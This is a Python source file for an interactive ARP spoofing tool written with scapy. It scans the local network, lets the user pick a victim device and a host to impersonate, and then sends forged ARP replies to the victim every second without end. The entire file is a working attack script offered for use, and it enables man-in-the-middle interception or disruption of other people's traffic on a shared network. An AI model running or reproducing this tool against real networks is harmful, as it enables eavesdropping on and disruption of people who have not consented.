from scapy.all import *
import time
import psutil
import ipaddress

class Spoofer:
    target_ip = ''
    target_mac = ''
    spoofed_ip = ''
    network_IP = ''

    # [0] = IP, [1] = MAC
    network_devices = []

    # store ifaces
    ifaces = []
    current_iface = ''

    # poisoned packet
    target_packet = ARP()

    def show_network_ifaces(self):
        # get netwroks interfaces names like Wi-fi Ethernet etc..
        addrs = psutil.net_if_addrs().items()
        index = 1

        print("Select the network interface: ")

        # display them in a list
        for iface, addrs in addrs:
            for addr in addrs:
                if addr.family == 2:
                    self.ifaces.append(
                        (iface, addr.address, addr.netmask)
                    )
                    print(f'[{index}] -> {iface}')
                    index += 1

    def scan_network(self):
        print(f"Scanning the network {self.network_IP}")
        # craft broadcast ARP frame
        ether = Ether(dst='ff:ff:ff:ff:ff:ff')
        arp = ARP(pdst=f"{self.network_IP}")
        frame = ether / arp

        # send the frame, and save answered and unanswered messages in variales
        r, u = srp(frame, timeout=5, iface=self.current_iface, verbose=False)

        # iterate over and print devices in network
        # also save results in a variable
        results = []
        index = 1
        for send, received in r:
            print(f"[{index}] -> IPv4: {received.psrc} MAC: {received.hwsrc}")
            results.append((received.psrc, received.hwsrc))
            index = index + 1

        # override results for each run
        self.network_devices = results

    def craft_packet(self):
        # craft the pacet, l2 having target MAC
        ether = Ether(dst=self.target_mac)
        arp = ARP(op=2, pdst=self.target_ip, psrc=self.spoofed_ip, hwdst=self.target_mac)

        # mount the packet 
        self.target_pkt = ether / arp

    def get_network_IP(self, network):
        # get IPv4 and netmask
        host_IP = network[1]
        netmask = network[2]

        # function to get the netwrok IP
        network_IP = ipaddress.IPv4Network(f'{host_IP}/{netmask}', strict=False)
        self.network_IP = network_IP

    def display_menu(self):
        print("============== ARP Target Spoofer ==============")
        print("=>> Coded by Poienariu Vlad <<=\n")

        # display network interfaces
        self.show_network_ifaces()
        iface_idx = int(input("\nChoose interface:\n> ")) - 1

        # set the current interface selected y the user
        self.current_iface = self.ifaces[iface_idx][0]
        self.get_network_IP(self.ifaces[iface_idx])

        # scan the network and populate devices list
        results = self.scan_network()
        total_devices = str(len(self.network_devices))

        index = int(input(f"\nChoose the target device [1-{total_devices}]: ")) - 1

        # assing IPv4 and MAC for te target
        self.target_ip = self.network_devices[index][0]
        self.target_mac = self.network_devices[index][1]

        # ask and assing spoofed address
        spoof_index = int(input(f"Who you pretend to be? [1-{total_devices}]: ")) - 1
        self.spoofed_ip = self.network_devices[spoof_index][0]

        # craft the packet with the details
        self.craft_packet()

        # start te script
        start = input("Start ?[Y/n]: ")
        if start.lower() == 'y' or start == "":
            self.start_listening()
        else:
            print("Bye!")
    
    def spoof(self):
        sendp(self.target_pkt, verbose=False)
        time.sleep(1)

    def start_listening(self):
        print("\n=== Starting spoofing ===")

        #count for fun
        pkt_count = 0

        print(f"Pretending to be {self.spoofed_ip} for {self.target_ip}")
        while True:
            self.spoof()
            print(f"=== Sent {pkt_count} packets in total", end='\r')
            pkt_count += 1

# init
spoofer = Spoofer()
spoofer.display_menu()
